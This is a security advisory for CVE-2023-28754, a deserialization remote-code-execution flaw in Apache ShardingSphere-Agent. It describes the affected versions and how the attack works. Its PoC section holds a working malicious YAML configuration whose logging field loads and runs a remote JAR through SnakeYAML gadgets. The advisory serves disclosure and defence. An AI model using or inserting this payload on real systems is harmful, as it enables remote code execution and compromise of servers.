---
description: CVE-2023-28754, High, Apache ShardingSphere-Agent Deserialization RCE
title: Apache ShardingSphere-Agent Deserialization RCE
date_published: "2023-07-23"
last_updated: "2023-07-23"
xray_id: XRAY-526292
vul_id: CVE-2023-28754
cvss: 8.1
severity: high
discovered_by: Liav Gutman
type: vulnerability

---

## Summary

Apache ShardingSphere-Agent Deserialization RCE

## Component

org.apache.shardingsphere:shardingsphere

## Affected versions

(,5.4.0)

## Description

Deserialization of Untrusted Data vulnerability in Apache ShardingSphere-Agent, which allows attackers to execute arbitrary code by constructing a special YAML configuration file.

The attacker needs to have permission to modify the ShardingSphere Agent YAML configuration file on the target machine, and the target machine can access the URL with the arbitrary code JAR.
An attacker can use SnakeYAML to deserialize java.net.URLClassLoader and make it load a JAR from a specified URL, and then deserialize javax.script.ScriptEngineManager to load code using that ClassLoader. When the ShardingSphere JVM process starts and uses the ShardingSphere-Agent, the arbitrary code specified by the attacker will be executed during the deserialization of the YAML configuration file by the Agent.

This issue affects ShardingSphere-Agent: through 5.3.2. This vulnerability is fixed in Apache ShardingSphere 5.4.0.

## PoC

Malicious ShardingSphere YAML configuration that will load an arbitrary remote JAR file -

```
plugins:
  logging:
    BaseLogging:
      props:
        level: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:7070/yaml-payload.jar"]]]]
  metrics:
    Prometheus:
      host:  "localhost"
      port: 9090
      props:
        jvm-information-collector-enabled: "true"
  tracing:
    Zipkin:
      host: "localhost"
      port: 9411
      props:
        service-name: "shardingsphere"
        url-version: "/api/v2/spans"
        sampler-type: "const"
        sampler-param: "1"
    OpenTelemetry:
      props:
        otel-resource-attributes: "service.name=shardingsphere"
        otel-traces-exporter: "zipkin"
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[http://www.openwall.com/lists/oss-security/2023/07/19/3](http://www.openwall.com/lists/oss-security/2023/07/19/3)

[https://lists.apache.org/thread/p8onhqox5kkwow9lc6gs03z28wtyp1cg](https://lists.apache.org/thread/p8onhqox5kkwow9lc6gs03z28wtyp1cg)

